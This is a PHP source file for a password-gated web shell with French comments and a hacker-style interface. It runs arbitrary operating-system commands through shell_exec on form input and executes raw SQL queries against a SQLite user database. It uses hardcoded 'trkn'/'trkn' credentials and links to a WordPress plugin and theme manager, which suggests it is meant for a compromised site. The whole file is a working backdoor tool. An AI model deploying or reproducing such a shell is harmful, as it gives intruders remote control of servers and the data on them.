<?php
// Informations de connexion
$login = 'trkn';
$password = 'trkn'; // Utilise un mot de passe sécurisé

// Utiliser SQLite pour la base de données
$db_path = 'demo_database.db';  // Nom de la base de données SQLite

// Connexion à la base de données SQLite
$pdo = new PDO("sqlite:$db_path");
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Protection par mot de passe
session_start();
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['login']) && isset($_POST['password'])) {
        if ($_POST['login'] === $login && $_POST['password'] === $password) {
            $_SESSION['logged_in'] = true;
        } else {
            echo "<div class='error'>Identifiants incorrects</div>";
        }
    }
    if (!isset($_SESSION['logged_in'])) {
        // Afficher le formulaire de connexion
        echo '<!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Webshell Login</title>
            <style>
                body {
                    background-color: #0d0d0d;
                    color: #00ff00;
                    font-family: monospace;
                    text-align: center;
                    padding: 50px;
                }
                input[type="text"], input[type="password"] {
                    background-color: #000;
                    color: #00ff00;
                    border: 1px solid #00ff00;
                    padding: 10px;
                    margin: 10px;
                }
                input[type="submit"] {
                    background-color: #00ff00;
                    color: #000;
                    padding: 10px 20px;
                    border: none;
                    cursor: pointer;
                }
                input[type="submit"]:hover {
                    background-color: #00cc00;
                }
                .error {
                    color: red;
                }
            </style>
        </head>
        <body>
            <h1>Login WebShell</h1>
            <form method="POST">
                Login: <input type="text" name="login"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Login">
            </form>
        </body>
        </html>';
        exit();
    }
}

// Ajouter un nouvel utilisateur
if (isset($_POST['add_user'])) {
    $new_user = 'trkn';
    $new_password = 'trkn'; // à chiffrer pour plus de sécurité

    // Créer une table users si elle n'existe pas déjà
    $pdo->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT)");

    // Vérifier si l'utilisateur existe déjà
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->execute(['username' => $new_user]);
    $user_exists = $stmt->fetch();

    if (!$user_exists) {
        // Ajouter un utilisateur
        $hashed_password = password_hash($new_password, PASSWORD_DEFAULT);
        $stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
        $stmt->execute(['username' => $new_user, 'password' => $hashed_password]);
        echo "<div class='success'>Utilisateur ajouté avec succès : $new_user</div>";
    } else {
        echo "<div class='error'>Utilisateur déjà existant : $new_user</div>";
    }
}

// Modifier un utilisateur
if (isset($_POST['modify_user'])) {
    $user_id = $_POST['user_id'];
    $new_password = $_POST['new_password'];

    if (!empty($new_password)) {
        $hashed_password = password_hash($new_password, PASSWORD_DEFAULT);
        $stmt = $pdo->prepare("UPDATE users SET password = :password WHERE id = :id");
        $stmt->execute(['password' => $hashed_password, 'id' => $user_id]);
        echo "<div class='success'>Mot de passe de l'utilisateur modifié avec succès.</div>";
    } else {
        echo "<div class='error'>Le mot de passe ne peut pas être vide.</div>";
    }
}

// Supprimer un utilisateur
if (isset($_POST['delete_user'])) {
    $user_id = $_POST['user_id'];
    $stmt = $pdo->prepare("DELETE FROM users WHERE id = :id");
    $stmt->execute(['id' => $user_id]);
    echo "<div class='success'>Utilisateur supprimé avec succès.</div>";
}

// Gérer les utilisateurs existants
if (isset($_POST['manage_user'])) {
    $stmt = $pdo->query("SELECT * FROM users");
    echo "<h3>Liste des utilisateurs :</h3><table border='1'><tr><th>ID</th><th>Nom d'utilisateur</th><th>Actions</th></tr>";
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        echo "<tr>
                <td>{$row['id']}</td>
                <td>{$row['username']}</td>
                <td>
                    <form method='POST' style='display:inline-block'>
                        <input type='hidden' name='user_id' value='{$row['id']}'>
                        Nouveau mot de passe: <input type='text' name='new_password'>
                        <input type='submit' name='modify_user' value='Modifier'>
                    </form>
                    <form method='POST' style='display:inline-block'>
                        <input type='hidden' name='user_id' value='{$row['id']}'>
                        <input type='submit' name='delete_user' value='Supprimer'>
                    </form>
                </td>
            </tr>";
    }
    echo "</table>";
}

// Interface pour exécuter des commandes shell
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<h3>Résultat de la commande :</h3><pre>" . shell_exec($cmd) . "</pre>";
}

// Interface pour exécuter des requêtes SQL
if (isset($_POST['sql'])) {
    $sql = $_POST['sql'];

    // Si la requête SQL est vide, on exécute la requête par défaut
    if (empty($sql)) {
        $sql = "SELECT * FROM users;";
    }

    try {
        $result = $pdo->query($sql);
        if ($result) {
            echo "<h3>Résultat de la requête SQL :</h3><table border='1'><tr>";
            for ($i = 0; $i < $result->columnCount(); $i++) {
                $col = $result->getColumnMeta($i);
                echo "<th>{$col['name']}</th>";
            }
            echo "</tr>";

            while ($row = $result->fetch(PDO::FETCH_ASSOC)) {
                echo "<tr>";
                foreach ($row as $data) {
                    echo "<td>{$data}</td>";
                }
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "Requête exécutée avec succès.";
        }
    } catch (PDOException $e) {
        echo "<div class='error'>Erreur SQL: " . $e->getMessage() . "</div>";
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebShell + Gestion SQLite</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #00ff00;
            font-family: monospace;
            padding: 20px;
            text-align: center;
        }
        h2, h3 {
            color: #00cc00;
        }
        input[type="text"], input[type="password"], input[type="submit"] {
            background-color: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            margin: 10px;
        }
        input[type="submit"] {
            background-color: #00ff00;
            color: #000;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: purple;
        }
        table {
            width: 100%;
            margin-top: 20px;
            color: #00ff00;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #00ff00;
            padding: 10px;
            text-align: left;
        }
        .error {
            color: red;
        }
        .success {
            color: #00ff00;
        }
        .button {
            background-color: blue;
            color: red;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 20px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
        }
        .button:hover {
            background-color: #fff000;
        }
</style>
</head>
<body>
    <h2>Bienvenue dans le WebShell sécurisé</h2>

    <h3>Ajouter un utilisateur</h3>
    <form method="POST">
        <input type="submit" name="add_user" value="Ajouter un utilisateur">
    </form>

    <h3>Gérer les utilisateurs</h3>
    <form method="POST">
        <input type="submit" name="manage_user" value="Voir la liste des utilisateurs">
    </form>

    <h3>Exécuter une commande shell</h3>
    <form method="POST">
        Commande: <input type="text" name="cmd">
        <input type="submit" value="Exécuter">
    </form>

    <form method="POST">
        <h3>Exécuter une requête SQL (la valeur par défaut est: SELECT * FROM users; si vide)</h3>
        Requête SQL: <input type="text" name="sql" placeholder="SELECT * FROM users;">
        <input type="submit" value="Exécuter">
    </form>
            <form action="/plug.php" method="get">
            <button type="submit" class="button">Gérer Plugins et Thèmes WordPress</button>
    </form>

</body>
</html>
